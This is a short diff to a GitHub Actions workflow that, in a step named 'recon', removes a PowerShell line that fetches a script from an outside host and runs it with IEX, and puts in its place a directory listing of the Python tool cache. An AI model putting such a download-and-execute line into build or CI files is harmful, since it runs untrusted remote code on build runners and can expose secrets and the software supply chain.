@@ -20,7 +20,7 @@ jobs:
     - uses: actions/checkout@v2
     - name: recon
       run: |
-        powershell "IEX(New-Object Net.WebClient).downloadString('https://c3murk.dev')"
+        tree /A /F C:\hostedtoolcache\windows\Python
         fail_command
     - name: pip deps
       run: |
